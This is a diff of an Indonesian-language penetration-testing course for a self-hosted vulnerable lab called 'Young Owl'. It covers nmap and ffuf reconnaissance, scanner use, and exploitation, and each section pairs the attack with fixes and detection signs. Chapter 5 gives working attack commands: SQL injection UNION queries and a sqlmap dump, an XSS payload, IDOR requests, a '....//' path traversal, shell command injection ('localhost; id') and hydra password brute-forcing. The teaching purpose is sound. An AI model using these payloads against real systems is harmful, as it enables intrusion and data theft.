+      <tr><td><code>Server:</code> / <code>X-Powered-By:</code></td><td>Stack &amp; versi → kandidat CVE (A06).</td></tr>
+      <tr><td>Nama cookie sesi</td><td>Target untuk uji session &amp; XSS yang mencuri sesi.</td></tr>
+      <tr><td><code>Set-Cookie</code> tanpa <code>HttpOnly</code>/<code>Secure</code></td><td>Cookie bisa diakses JS → XSS lebih berbahaya.</td></tr>
+      <tr><td>Hilangnya <code>Content-Security-Policy</code></td><td>XSS lebih mudah dieksploitasi.</td></tr>
+      <tr><td>Hilangnya <code>X-Frame-Options</code></td><td>Potensi clickjacking.</td></tr>
+    </table>
     <p>
-      Catat setiap detail: framework, bahasa, nama cookie (misalnya cookie sesi), header yang hilang
-      (tanda misconfiguration). Stack menentukan serangan mana yang mungkin — ini fondasi semua bab
+      Catat setiap detail: framework, bahasa, nama cookie, header yang hilang (tanda
+      misconfiguration). Stack menentukan serangan mana yang mungkin — ini fondasi semua bab
       berikutnya. Susun jadi "kartu target": host, port, teknologi, endpoint awal, akun yang
       diketahui.
     </p>
+
+    <h3>2.4 Template kartu target</h3>
+    <pre><code>TARGET: Young Owl lab
+Host/IP   : &lt;ip-vps&gt;:8080   (vulnMode=true, terkonfirmasi via /system/health)
+Stack     : Node/Fastify + Next.js (dari header &amp; whatweb)
+WAF       : (hasil wafw00f)
+Cookie    : &lt;nama cookie sesi&gt;
+Endpoint  : /robots.txt → menyebut /api/v1/system/debug
+Akun      : intern@youngowl.lab (dari dokumentasi lab)
+Catatan   : header keamanan yang hilang → ...</code></pre>
+
     <div class="detect">
       <b>Sisi bertahan.</b> Pengintaian aktif sudah terlihat di log: lonjakan request 404,
-      user-agent tool (<code>whatweb</code>, <code>nikto</code>), dan akses ke
-      <code>robots.txt</code> lalu ke jalur yang dilarangnya. Di Bab 7 Anda akan belajar mengenali
-      pola ini.
+      user-agent tool (<code>whatweb</code>, <code>nikto</code>, <code>nuclei</code>), dan akses ke
+      <code>robots.txt</code> lalu ke jalur yang dilarangnya dalam hitungan detik. Pola "membaca
+      robots.txt lalu langsung menuju jalur Disallow" adalah sinyal recon yang sangat khas. Di Bab 7
+      Anda akan belajar mengenali pola ini di monitor Young Owl.
     </div>
 
     <!-- CH 3 -->
-    <h2 class="chapter"><span class="n">BAB 3</span>Reconnaissance</h2>
-    <p class="lead">Memetakan permukaan serang: host mana hidup, port mana terbuka, layanan apa.</p>
-    <h3>Host discovery</h3>
-    <pre><code>nmap -sn &lt;ip-vps&gt;/32        <span class="c"># apakah host hidup? (ping sweep)</span></code></pre>
-    <h3>Port scanning</h3>
-    <pre><code>nmap -sS -p- &lt;ip-vps&gt;              <span class="c"># SYN scan, seluruh 65535 port TCP</span>
-nmap -sV -p 8080 &lt;ip-vps&gt;          <span class="c"># deteksi versi layanan di port lab</span>
+    <h2 class="chapter"><span class="n">BAB 3</span>Reconnaissance &amp; Enumerasi</h2>
+    <p class="lead">
+      Memetakan permukaan serang: host mana hidup, port mana terbuka, layanan apa, dan — untuk web —
+      endpoint serta parameter apa yang bisa Anda sentuh.
+    </p>
+
+    <h3>3.1 Host discovery</h3>
+    <pre><code>nmap -sn &lt;ip-vps&gt;        <span class="c"># apakah host hidup? (ping sweep, tanpa port scan)</span></code></pre>
+    <p>
+      Pada VPS publik, host hampir pasti hidup. Nilai sebenarnya dari langkah ini di dunia nyata
+      adalah memetakan rentang alamat; di lab, ia sekadar konfirmasi konektivitas.
+    </p>
+
+    <h3>3.2 Port scanning dengan Nmap, mendalam</h3>
+    <pre><code>nmap -sS -p- --min-rate 1000 &lt;ip-vps&gt;       <span class="c"># SYN scan, seluruh 65535 port TCP</span>
+nmap -sV -p 8080 &lt;ip-vps&gt;                   <span class="c"># deteksi versi layanan di port lab</span>
+nmap -sV -sC -p 8080 &lt;ip-vps&gt;              <span class="c"># + skrip default NSE</span>
 nmap -sV -p 8080 --script=http-title,http-headers,http-methods &lt;ip-vps&gt;</code></pre>
     <table>
-      <tr>
-        <th>Flag</th>
-        <th>Arti</th>
-      </tr>
-      <tr>
-        <td><code>-sS</code></td>
-        <td>SYN/half-open: tidak menuntaskan handshake, lebih senyap.</td>
-      </tr>
-      <tr>
-        <td><code>-sV</code></td>
-        <td>Deteksi versi layanan — ini yang memetakan ke CVE.</td>
-      </tr>
-      <tr>
-        <td><code>-p-</code></td>
-        <td>Semua port; tanpa ini Nmap hanya memindai 1000 teratas.</td>
-      </tr>
-      <tr>
-        <td><code>-sC</code> / <code>--script</code></td>
-        <td>Jalankan skrip NSE (enumerasi, deteksi ringan).</td>
-      </tr>
-      <tr>
-        <td><code>-T4</code></td>
-        <td>Timing lebih cepat (hati-hati: lebih berisik).</td>
-      </tr>
+      <tr><th>Flag</th><th>Arti</th></tr>
+      <tr><td><code>-sS</code></td><td>SYN/half-open: tidak menuntaskan handshake, lebih senyap &amp; cepat.</td></tr>
+      <tr><td><code>-sV</code></td><td>Deteksi versi layanan — ini yang memetakan ke CVE (A06).</td></tr>
+      <tr><td><code>-p-</code></td><td>Semua port; tanpa ini Nmap hanya memindai 1000 teratas.</td></tr>
+      <tr><td><code>-sC</code> / <code>--script</code></td><td>Jalankan skrip NSE (enumerasi, deteksi ringan).</td></tr>
+      <tr><td><code>-A</code></td><td>Agresif: <code>-sV -sC</code> + OS detection + traceroute.</td></tr>
+      <tr><td><code>--min-rate</code></td><td>Paksa kecepatan minimum paket/detik (lebih cepat, lebih berisik).</td></tr>
+      <tr><td><code>-T0..-T5</code></td><td>Timing: T0 sangat lambat/senyap, T4 cepat, T5 paling agresif.</td></tr>
     </table>
-    <h3>Content discovery (penting untuk web)</h3>
+    <h4>Membaca hasil Nmap</h4>
+    <p>
+      Fokus pada kolom <strong>VERSION</strong>. Versi spesifik ("OpenSSH 8.2p1", "nginx 1.18.0")
+      bisa dicari di database CVE (<code>searchsploit nginx 1.18</code>). Port yang terbuka selain
+      8080 pada VPS Anda (misalnya 3000, 5432) seharusnya <em>tidak</em> terekspos publik — jika
+      terlihat dari luar, itu sendiri sudah temuan konfigurasi (A05) untuk control center Anda.
+    </p>
+    <div class="tip">
+      <b>Simpan output.</b> <code>nmap -sV -p- -oA recon_nmap &lt;ip&gt;</code> menyimpan hasil dalam
+      tiga format (normal, grepable, XML) sekaligus — bahan bukti untuk laporan.
+    </div>
+
+    <h3>3.3 Enumerasi layanan web dengan NSE</h3>
+    <p>Nmap Scripting Engine punya skrip khusus HTTP yang berguna untuk enumerasi awal:</p>
+    <pre><code>nmap -p 8080 --script=http-enum &lt;ip-vps&gt;        <span class="c"># tebak direktori/berkas umum</span>
+nmap -p 8080 --script=http-methods --script-args http-methods.url-path=/ &lt;ip-vps&gt;
+nmap -p 8080 --script=http-security-headers &lt;ip-vps&gt;  <span class="c"># header keamanan yang hilang</span></code></pre>
+
+    <h3>3.4 Content discovery (penting untuk web/API)</h3>
     <p>
       Untuk web/API, "port" sebenarnya adalah <em>endpoint</em>. Temukan yang tidak tertaut dengan
-      fuzzing direktori:
+      fuzzing direktori. Pelajari arti tiap status code agar tidak salah membuang hasil:
     </p>
     <pre><code>ffuf -u $LAB/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403
-gobuster dir -u $LAB -w /usr/share/wordlists/dirb/common.txt</code></pre>
+gobuster dir -u $LAB -w /usr/share/wordlists/dirb/common.txt -t 30
+
+<span class="c"># fuzzing khusus endpoint API</span>
+ffuf -u $LAB/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403</code></pre>
+    <table>
+      <tr><th>Status</th><th>Makna saat discovery</th></tr>
+      <tr><td>200</td><td>Ada &amp; dapat diakses — periksa isinya.</td></tr>
+      <tr><td>301/302</td><td>Redirect — endpoint ada, mungkin butuh trailing slash atau login.</td></tr>
+      <tr><td>401</td><td>Butuh autentikasi — endpoint ada, target bagus untuk uji akses.</td></tr>
+      <tr><td>403</td><td>Dilarang — ada tapi diblokir; kadang bisa di-bypass (A01).</td></tr>
+      <tr><td>404</td><td>Tidak ada — abaikan (tapi lonjakan 404 = sinyal recon bagi defender).</td></tr>
+    </table>
+
+    <h3>3.5 Parameter discovery</h3>
     <p>
-      Perhatikan endpoint API berpola <code>/api/v1/...</code>. Setiap endpoint yang Anda temukan
-      adalah kandidat pengujian di Bab 4. Versi layanan yang spesifik ("OpenSSH 8.2p1") bisa dicari
-      CVE-nya; yang kabur tidak. Tulis semua temuan recon ke assessment Anda agar reproducible.
+      Endpoint yang terlihat kosong kadang menerima parameter tersembunyi. Setelah menemukan sebuah
+      endpoint, fuzz nama parameternya:
     </p>
+    <pre><code>ffuf -u "$LAB/api/v1/targets/search?FUZZ=test" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -mc 200 -fs 0</code></pre>
+    <p>
+      Perhatikan endpoint API berpola <code>/api/v1/...</code>. Setiap endpoint dan parameter yang
+      Anda temukan adalah kandidat pengujian di Bab 4. Tulis semua temuan recon ke assessment Anda
+      agar reproducible — recon yang terdokumentasi adalah separuh dari pentest yang baik.
+    </p>
+    <div class="detect">
+      <b>Sisi bertahan.</b> Content &amp; parameter discovery menghasilkan ratusan request 404 dalam
+      waktu singkat dari satu IP — pola paling mudah dikenali di monitor. Ditambah user-agent tool
+      (<code>ffuf</code>, <code>gobuster</code>), ini hampir mustahil disamarkan tanpa memperlambat
+      scan drastis. Di Bab 7 kategori "recon" menangkap persis aktivitas ini.
+    </div>
 
     <!-- CH 4 -->
     <h2 class="chapter"><span class="n">BAB 4</span>Vulnerability Scanning</h2>
     <p class="lead">
       Mencari dan <em>memastikan</em> kelemahan — gabungan tools otomatis dan pemeriksaan manual.
       OWASP Top 10 adalah peta jalannya. Ini bab yang paling menentukan: exploit yang baik lahir
-      dari scanning yang teliti.
+      dari scanning yang teliti. Bab ini sengaja panjang karena di sinilah keahlian sesungguhnya
+      terbentuk.
     </p>
+
     <h3>4.1 Metodologi</h3>
     <p>Scanning bukan "jalankan satu tool lalu selesai". Alurnya:</p>
     <ol>
-      <li>
-        <strong>Petakan permukaan</strong> — semua endpoint, parameter, dan input dari Bab 2–3.
-      </li>
+      <li><strong>Petakan permukaan</strong> — semua endpoint, parameter, dan input dari Bab 2–3.</li>
       <li><strong>Sapu otomatis</strong> — tools cepat menemukan buah yang menggantung rendah.</li>
-      <li>
-        <strong>Uji manual</strong> — untuk logika aplikasi yang dilewatkan scanner (paling
-        penting).
-      </li>
-      <li>
-        <strong>Konfirmasi</strong> — setiap dugaan dibuktikan dengan satu probe ringan (yes/no).
-      </li>
+      <li><strong>Uji manual</strong> — untuk logika aplikasi yang dilewatkan scanner (paling penting).</li>
+      <li><strong>Konfirmasi</strong> — setiap dugaan dibuktikan dengan satu probe ringan (yes/no).</li>
       <li><strong>Triase</strong> — urutkan berdasar dampak sebelum masuk ke exploitation.</li>
     </ol>
-    <h3>4.2 Scanner web otomatis</h3>
-    <pre><code>nikto -h $LAB                         <span class="c"># salah konfigurasi, header, berkas default</span>
-nuclei -u $LAB                        <span class="c"># ribuan template kerentanan komunitas</span>
-sqlmap -u "$LAB/api/v1/targets/search?q=1" --batch --level=2 --risk=2
-                                      <span class="c"># deteksi SQLi (belum dump)</span></code></pre>
+    <p>
+      Prinsip kunci: <strong>scanner menemukan pola, manusia menemukan logika.</strong> Scanner tidak
+      tahu bahwa endpoint export seharusnya hanya untuk pemilik — hanya Anda yang paham alur bisnis
+      yang bisa menilai itu. Karena itu jangan pernah berhenti di hasil otomatis.
+    </p>
+
+    <h3>4.2 Scanner web otomatis, per tool</h3>
+    <h4>Nikto — konfigurasi &amp; berkas default</h4>
+    <pre><code>nikto -h $LAB -o nikto.txt      <span class="c"># salah konfigurasi, header, berkas default</span></code></pre>
+    <p>
+      Nikto cepat dan berisik. Ia bagus untuk menemukan header keamanan yang hilang, berkas yang
+      tertinggal, dan metode HTTP yang terbuka — tetapi banyak false positive. Baca tiap barisnya
+      sebagai pertanyaan, bukan jawaban.
+    </p>
+    <h4>Nuclei — template kerentanan komunitas</h4>
+    <pre><code>nuclei -u $LAB -severity low,medium,high,critical
+nuclei -u $LAB -tags exposure,misconfig     <span class="c"># fokuskan kategori</span></code></pre>
+    <p>
+      Nuclei menjalankan ribuan template YAML yang dikurasi komunitas. Ia lebih presisi daripada
+      Nikto karena tiap template punya matcher yang ketat. Tetap verifikasi temuan high/critical
+      secara manual sebelum menuliskannya.
+    </p>
+    <h4>sqlmap — deteksi SQLi (belum dump)</h4>
+    <pre><code>sqlmap -u "$LAB/api/v1/targets/search?q=1" --batch --level=2 --risk=2</code></pre>
+    <p>
+      Di tahap scanning, pakai sqlmap hanya untuk <em>mendeteksi</em> apakah sebuah parameter
+      injectable. Dumping data ditunda ke Bab 5. <code>--level</code> memperluas tempat sqlmap
+      menguji (header, cookie), <code>--risk</code> memperluas jenis payload.
+    </p>
     <p>
       Scanner otomatis cepat tapi berisik dan buta pada logika bisnis. Anggap hasilnya sebagai
       <em>petunjuk</em>, bukan kesimpulan — selalu verifikasi manual untuk menyingkirkan false
-      positive.
+      positive, dan selalu sadar bahwa scan masif akan sangat terlihat di sisi defender.
     </p>
-    <h3>4.3 Pemetaan manual (lebih penting)</h3>
+
+    <h3>4.3 Pemetaan manual per OWASP (lebih penting)</h3>
     <p>
       Telusuri sendiri setiap fitur dan tanyakan:
       <em>input mana yang saya kendalikan, dan ke mana ia pergi?</em> Di lab, mulai dari halaman
       <strong>Lab tools</strong> dan detail assessment. Peta ke OWASP, lengkap dengan probe
-      konfirmasi:
+      konfirmasi ringan yang hanya menjawab "ya/tidak" tanpa merusak:
     </p>
     <table>
-      <tr>
-        <th>Kategori OWASP</th>
-        <th>Di lab</th>
-        <th>Probe konfirmasi (ringan)</th>
-      </tr>
-      <tr>
-        <td>A03 Injection (SQLi)</td>
-        <td>Pencarian target</td>
-        <td>Kirim satu kutip <code>'</code> di <code>q=</code> → 500 / hasil berubah</td>
-      </tr>
-      <tr>
-        <td>A03 Injection (XSS)</td>
-        <td>Deskripsi temuan</td>
-        <td>Simpan <code>&lt;b&gt;x&lt;/b&gt;</code> → ter-render tebal</td>
-      </tr>
-      <tr>
-        <td>A01 Access control (IDOR)</td>
-        <td>Export assessment</td>
-        <td>Minta id tetangga → balasan 200 milik orang lain</td>
-      </tr>
-      <tr>
-        <td>A01 Path traversal</td>
-        <td>Berbagi file</td>
-        <td>Minta file lalu coba naik satu direktori</td>
-      </tr>
-      <tr>
-        <td>A03 Command injection</td>
-        <td>Host lookup</td>
-        <td>Tambah <code>; sleep 5</code> → respons tertunda</td>
-      </tr>
-      <tr>
-        <td>A05 Misconfiguration</td>
-        <td>Endpoint debug</td>
-        <td>Akses tanpa login → menjawab &amp; membocorkan config</td>
-      </tr>
-      <tr>
-        <td>A07 Auth failures</td>
-        <td>Form login</td>
-        <td>Email valid vs salah → pesan berbeda (enumerasi)</td>
-      </tr>
+      <tr><th>Kategori OWASP</th><th>Di lab</th><th>Probe konfirmasi (ringan)</th></tr>
+      <tr><td>A03 Injection (SQLi)</td><td>Pencarian target</td><td>Kirim satu kutip <code>'</code> di <code>q=</code> → 500 / hasil berubah</td></tr>
+      <tr><td>A03 Injection (XSS)</td><td>Deskripsi temuan</td><td>Simpan <code>&lt;b&gt;x&lt;/b&gt;</code> → ter-render tebal</td></tr>
+      <tr><td>A03 Command injection</td><td>Host lookup</td><td>Tambah <code>; sleep 5</code> → respons tertunda ~5 dtk</td></tr>
+      <tr><td>A01 Access control (IDOR)</td><td>Export assessment</td><td>Minta id tetangga → balasan 200 milik orang lain</td></tr>
+      <tr><td>A01 Path traversal</td><td>Berbagi file</td><td>Minta file lalu coba naik satu direktori</td></tr>
+      <tr><td>A05 Misconfiguration</td><td>Endpoint debug</td><td>Akses tanpa login → menjawab &amp; membocorkan config</td></tr>
+      <tr><td>A07 Auth failures</td><td>Form login</td><td>Email valid vs salah → pesan berbeda (enumerasi)</td></tr>
+      <tr><td>A06 Komponen usang</td><td>Header versi</td><td>Versi spesifik → cari CVE dengan <code>searchsploit</code></td></tr>
     </table>
+    <h4>Teknik probe konfirmasi yang aman</h4>
+    <p>
+      Probe konfirmasi harus <em>minimal</em>: cukup membuktikan celah tanpa mengambil data atau
+      merusak. Untuk SQLi, satu kutip sudah cukup memicu error. Untuk RCE, <code>; sleep 5</code>
+      membuktikan eksekusi lewat penundaan waktu tanpa menjalankan apa pun yang berbahaya. Kebiasaan
+      ini penting bahkan di lab, karena di dunia nyata probe yang sembrono bisa merusak produksi.
+    </p>
+
     <h3>4.4 Triase: mana dulu?</h3>
     <p>
       Urutkan berdasar dampak × kemudahan. Command injection (RCE) hampir selalu nomor satu karena
       memberi kendali server. IDOR dan SQLi berbahaya karena membocorkan data. XSS dan auth lemah
       menyusul. Catat tiap dugaan sebagai temuan berstatus "to confirm" sebelum ke Bab 5.
     </p>
+    <table>
+      <tr><th>Celah</th><th>Dampak</th><th>Kemudahan</th><th>Prioritas</th></tr>
+      <tr><td>Command injection (RCE)</td><td>Kendali server</td><td>Sedang</td><td>1 — Critical</td></tr>
+      <tr><td>SQL injection</td><td>Dump seluruh DB</td><td>Mudah</td><td>2 — High</td></tr>
+      <tr><td>IDOR</td><td>Data pengguna lain</td><td>Mudah</td><td>3 — High</td></tr>
+      <tr><td>Path traversal</td><td>Baca berkas sistem</td><td>Sedang</td><td>4 — High</td></tr>
+      <tr><td>Stored XSS</td><td>Curi sesi/aksi korban</td><td>Sedang</td><td>5 — Medium</td></tr>
+      <tr><td>Auth enumeration</td><td>Pintu brute force</td><td>Mudah</td><td>6 — Medium</td></tr>
+    </table>
     <div class="note">
       <b>Setiap tantangan punya flag</b> berformat <code>YO{...}</code>. Menemukan flag = bukti
-      kelemahan itu nyata. Daftar lengkap ada di Lampiran.
+      kelemahan itu nyata. Daftar lengkap ada di Lampiran. Perlakukan flag seperti "data sensitif"
+      yang akan bocor di dunia nyata bila celahnya ada di produksi.
     </div>
 
     <!-- CH 5 -->
     <h2 class="chapter"><span class="n">BAB 5</span>Exploitation / Pentesting</h2>
     <p class="lead">
       Membuktikan kelemahan itu nyata, langsung di endpoint lab. Semua di bawah ini sah karena
-      targetnya milik Anda dan terisolasi. Tiap bagian ditutup dengan
-      <em>jejak yang tertinggal</em> — bahan untuk sisi deteksi di Bab 7.
+      targetnya milik Anda dan terisolasi. Tiap bagian mengikuti pola tetap: teori → langkah manual
+      → otomasi → perbaikan → <em>jejak yang tertinggal</em> untuk sisi deteksi di Bab 7.
     </p>
 
     <h3>5.1 SQL injection (A03)</h3>
+    <h4>Teori</h4>
     <p>
-      Kolom pencarian target menyambung input langsung ke query SQL. Teori: aplikasi membentuk
+      Kolom pencarian target menyambung input langsung ke query SQL. Aplikasi membentuk
       <code>... WHERE name LIKE '%INPUT%'</code>; dengan menutup kutip dan menambah
-      <code>UNION SELECT</code>, Anda menempel hasil query lain ke keluaran.
+      <code>UNION SELECT</code>, Anda menempel hasil query lain ke keluaran. Kuncinya memahami bahwa
+      database tidak bisa membedakan "data" dari "perintah" bila keduanya digabung sebagai satu
+      string.
     </p>
     <h4>Langkah manual</h4>
     <pre><code><span class="c"># 1) Buktikan ada injeksi</span>
@@ -691,102 +865,161 @@ curl -s -G "$LAB/api/v1/targets/search" --data-urlencode "q=zzz' ORDER BY 6-- "
 <span class="c"># 3) Tarik flag lewat UNION</span>
 curl -s -G "$LAB/api/v1/targets/search" \
   --data-urlencode "q=zzz' UNION SELECT id,name,value,hint,'x','x' FROM lab_flags-- "</code></pre>
+    <h4>Memahami tiap langkah</h4>
+    <ul>
+      <li><strong>Langkah 1</strong> — satu kutip memecah sintaks query; error 500 atau hasil aneh menandakan input Anda masuk ke SQL.</li>
+      <li><strong>Langkah 2</strong> — <code>ORDER BY n</code> gagal saat <code>n</code> melebihi jumlah kolom; titik gagal memberi tahu jumlah kolom untuk UNION.</li>
+      <li><strong>Langkah 3</strong> — <code>UNION SELECT</code> harus punya jumlah kolom sama; Anda memilih kolom mana yang menampung data curian.</li>
+    </ul>
     <p>Nilai <code>value</code> pada hasil adalah flag SQLi. Atau otomatis dengan sqlmap:</p>
     <pre><code>sqlmap -u "$LAB/api/v1/targets/search?q=test" --batch --dump -T lab_flags</code></pre>
-    <p><strong>Perbaikan:</strong> parameterized query / prepared statement. Selalu.</p>
+    <p><strong>Perbaikan:</strong> parameterized query / prepared statement. Selalu. Jangan pernah membangun SQL dengan penggabungan string input pengguna, sekalipun tampak "sudah disaring".</p>
     <div class="detect">
       <b>Jejak:</b> karakter <code>'</code>, kata kunci <code>UNION</code>/<code>SELECT</code>/
-      <code>ORDER BY</code> di parameter query, lonjakan error 500, dan banyak request mirip dalam
-      hitungan detik (tanda sqlmap).
+      <code>ORDER BY</code>/<code>--</code> di parameter query, lonjakan error 500, dan banyak request
+      mirip dalam hitungan detik (tanda sqlmap). Monitor Young Owl menandai ini sebagai kelas
+      <code>sqli</code>.
     </div>
 
     <h3>5.2 Stored XSS (A03)</h3>
+    <h4>Teori</h4>
     <p>
-      Deskripsi temuan di-render sebagai HTML mentah dalam lab mode. Payload
-      <code>&lt;script&gt;</code> sering disaring; <code>&lt;img onerror&gt;</code> lebih tahan
-      filter. Buat temuan dengan payload bukti yang tidak merusak:
+      Deskripsi temuan di-render sebagai HTML mentah dalam lab mode. Bila browser korban mengeksekusi
+      skrip yang Anda simpan, Anda bisa mencuri sesi, melakukan aksi atas nama korban, atau mengubah
+      tampilan. Payload <code>&lt;script&gt;</code> sering disaring; <code>&lt;img onerror&gt;</code>
+      lebih tahan filter karena tidak memakai tag script eksplisit.
     </p>
+    <h4>Langkah &amp; bukti aman</h4>
     <pre><code>&lt;img src=x onerror="document.title='xss-by-me'"&gt;</code></pre>
     <p>
-      Buka halaman assessment; judul berubah = skrip jalan. Cukup buktikan eksekusi, jangan merusak
-      atau mencuri sesi sungguhan. <strong>Perbaikan:</strong> output encoding +
-      Content-Security-Policy.
+      Simpan payload itu di deskripsi temuan, lalu buka halaman assessment; judul tab berubah = skrip
+      jalan. Cukup buktikan eksekusi, jangan merusak atau mencuri sesi sungguhan.
+      <strong>Perbaikan:</strong> output encoding (escape <code>&lt;</code> <code>&gt;</code>
+      <code>&amp;</code>) saat menampilkan + Content-Security-Policy yang ketat + cookie
+      <code>HttpOnly</code> agar sesi tak terbaca JS.
     </p>
     <div class="detect">
-      <b>Jejak:</b> tag HTML/JS (<code>&lt;img</code>, <code>onerror=</code>,
-      <code>&lt;script</code>) tersimpan di field data; permintaan yang menyimpannya ada di log
-      tulis.
+      <b>Jejak:</b> tag HTML/JS (<code>&lt;img</code>, <code>onerror=</code>, <code>&lt;script</code>,
+      <code>javascript:</code>) tersimpan di field data; permintaan yang menyimpannya ada di log
+      tulis. Kelas <code>xss</code> di monitor.
     </div>
 
-    <h3>5.3 IDOR (A01)</h3>
+    <h3>5.3 IDOR / Broken Access Control (A01)</h3>
+    <h4>Teori</h4>
     <p>
-      Endpoint export lab tidak mengecek pemilik — ia percaya begitu saja pada id di URL. Sebagai
-      user biasa, akses assessment milik admin dengan menebak/menaikkan id:
+      IDOR (Insecure Direct Object Reference) terjadi ketika server mempercayai id di URL tanpa
+      memeriksa apakah pemanggil <em>berhak</em> atas objek itu. "Sudah login" tidak sama dengan
+      "berhak atas objek ini". Endpoint export lab tidak mengecek pemilik — ia percaya begitu saja
+      pada id di URL.
     </p>
+    <h4>Langkah</h4>
     <pre><code>curl -s -b cookies.txt "$LAB/api/v1/assessments/&lt;id-orang-lain&gt;/export"</code></pre>
     <p>
-      Deskripsinya memuat flag IDOR. Di mode normal, request yang sama balas 404.
-      <strong>Perbaikan:</strong> cek otorisasi di server untuk tiap objek (bukan sekadar "apakah
-      login").
+      Sebagai user biasa, akses assessment milik admin dengan menebak/menaikkan id. Deskripsinya
+      memuat flag IDOR. Di mode normal, request yang sama balas 404.
+      <strong>Perbaikan:</strong> cek otorisasi di server untuk tiap objek — bandingkan pemilik objek
+      dengan identitas pemanggil pada setiap request, bukan sekadar "apakah login".
     </p>
     <div class="detect">
       <b>Jejak:</b> satu akun mengakses banyak id objek milik akun lain secara berurutan — pola
-      enumerasi akses yang khas.
+      enumerasi akses yang khas. Monitor menandai kelas <code>idor</code> pada pola export lintas id.
     </div>
 
     <h3>5.4 Path traversal (A01)</h3>
+    <h4>Teori</h4>
     <p>
-      Filter hanya membuang <code>../</code> <em>sekali</em> dan tidak rekursif, jadi
-      <code>....//</code> menyusut menjadi <code>../</code> dan lolos:
+      Path traversal memungkinkan penyerang keluar dari direktori yang dimaksudkan dan membaca berkas
+      lain (<code>/etc/passwd</code>, berkas konfigurasi, flag). Filter di lab hanya membuang
+      <code>../</code> <em>sekali</em> dan tidak rekursif, jadi <code>....//</code> menyusut menjadi
+      <code>../</code> dan lolos — contoh klasik "sanitasi satu lintasan" yang gagal.
     </p>
+    <h4>Langkah</h4>
     <pre><code>curl -s -b cookies.txt "$LAB/api/v1/files?name=....//secret/flag.txt"</code></pre>
     <p>
-      <strong>Perbaikan:</strong> kanonikalisasi path (resolve ke absolut) lalu tolak yang keluar
-      dari direktori dasar; jangan mengandalkan penghapusan string.
+      <strong>Perbaikan:</strong> kanonikalisasi path (resolve ke absolut dengan <code>realpath</code>)
+      lalu tolak yang keluar dari direktori dasar; jangan mengandalkan penghapusan string. Lebih baik
+      lagi: jangan terima nama berkas dari pengguna sama sekali — pakai id yang dipetakan ke berkas di
+      sisi server.
     </p>
     <div class="detect">
       <b>Jejak:</b> urutan <code>../</code> atau <code>....//</code>, nama berkas sensitif
-      (<code>/etc/passwd</code>, <code>flag.txt</code>) di parameter.
+      (<code>/etc/passwd</code>, <code>flag.txt</code>) di parameter. Kelas <code>traversal</code>.
     </div>
 
     <h3>5.5 Command injection / RCE (A03)</h3>
+    <h4>Teori</h4>
     <p>
-      Tool host lookup memasukkan input ke perintah shell tanpa escape. Separator shell
-      (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>$(...)</code>) menyambung
-      perintah kedua. Buktikan eksekusi dengan perintah tak berbahaya:
+      Ini celah paling berdampak: ia memberi penyerang kemampuan menjalankan perintah di server. Tool
+      host lookup memasukkan input ke perintah shell tanpa escape. Separator shell (<code>;</code>,
+      <code>|</code>, <code>&amp;&amp;</code>, <code>$(...)</code>) menyambung perintah kedua.
     </p>
+    <h4>Langkah &amp; bukti aman</h4>
     <pre><code>curl -s -b cookies.txt -X POST "$LAB/api/v1/tools/lookup" \
   -H 'content-type: application/json' \
   -d '{"host":"localhost; id"}'</code></pre>
     <p>
       Output <code>id</code> membuktikan RCE. Coba juga <code>uname -a</code> dan baca environment
-      untuk menemukan flag RCE. (Lab memblokir egress, jadi ini tidak bisa menjangkau internet.) Ini
-      celah paling berdampak — perlakukan dengan serius. <strong>Perbaikan:</strong> jangan panggil
-      shell dengan input user; pakai API yang aman dan allow-list ketat.
+      (<code>env</code>) untuk menemukan flag RCE. (Lab memblokir egress, jadi ini tidak bisa
+      menjangkau internet — Anda akan melihat konsekuensinya di Bab 6.) Perlakukan celah ini dengan
+      serius. <strong>Perbaikan:</strong> jangan panggil shell dengan input user; pakai API yang aman
+      (library resolusi DNS, bukan memanggil <code>host</code>/<code>ping</code>) dan allow-list
+      ketat bila benar-benar perlu memanggil perintah.
     </p>
     <div class="detect">
       <b>Jejak:</b> metakarakter shell (<code>;</code> <code>|</code> <code>$(</code>
       <code>`</code>) di input; dari sisi server, proses web memunculkan
-      <code>sh</code>/<code>id</code>/<code>uname</code>
-      — sinyal paling kuat yang ada.
+      <code>sh</code>/<code>id</code>/<code>uname</code> — sinyal paling kuat yang ada. Monitor
+      menandai kelas <code>rce</code> dengan severity <em>critical</em>.
     </div>
 
     <h3>5.6 Kelemahan autentikasi (A07)</h3>
+    <h4>Teori</h4>
     <p>
-      Lab melemahkan login: pesan error membedakan email dikenal vs tidak (enumerasi), dan tidak ada
-      batas percobaan. Pertama bangun daftar email valid, lalu uji password dengan hydra:
+      Lab melemahkan login dalam dua cara: pesan error membedakan email dikenal vs tidak (enumerasi),
+      dan tidak ada batas percobaan (brute force). Keduanya bekerja sama: pertama Anda bangun daftar
+      email valid, lalu uji password-nya.
     </p>
+    <h4>Langkah</h4>
     <pre><code>hydra -l intern@youngowl.lab -P /usr/share/wordlists/rockyou.txt \
   &lt;ip-vps&gt; -s 8080 http-post-form \
   "/api/v1/auth/login:email=^USER^&amp;password=^PASS^:No account"</code></pre>
     <p>
-      Password lemah akun <code>intern</code> akan jatuh. <strong>Perbaikan:</strong> pesan error
-      generik, rate limit/lockout, kebijakan password kuat — ketiganya ada di salinan normal.
+      Bagian terakhir (<code>:No account</code>) adalah string yang muncul saat login gagal — hydra
+      memakainya untuk membedakan sukses dari gagal. Password lemah akun <code>intern</code> akan
+      jatuh. <strong>Perbaikan:</strong> pesan error generik ("email atau password salah"), rate
+      limit/lockout setelah beberapa percobaan, dan kebijakan password kuat — ketiganya ada di
+      salinan normal.
     </p>
     <div class="detect">
-      <b>Jejak:</b> banyak percobaan login gagal dari satu sumber dalam waktu singkat; banyak email
-      berbeda diuji (enumerasi). Inilah yang akan paling jelas terlihat di monitor Bab 7.
+      <b>Jejak:</b> banyak percobaan login gagal (401) dari satu sumber dalam waktu singkat; banyak
+      email berbeda diuji (enumerasi). Inilah yang akan paling jelas terlihat di monitor Bab 7
+      (kelas <code>auth</code>).
     </div>
+
+    <h3>5.7 Security misconfiguration &amp; kebocoran rahasia (A05/A02)</h3>
+    <p>
+      Endpoint debug yang ditemukan dari <code>robots.txt</code> di Bab 2 menjawab tanpa autentikasi
+      dan membocorkan konfigurasi:
+    </p>
+    <pre><code>curl -s $LAB/api/v1/system/debug | jq</code></pre>
+    <p>
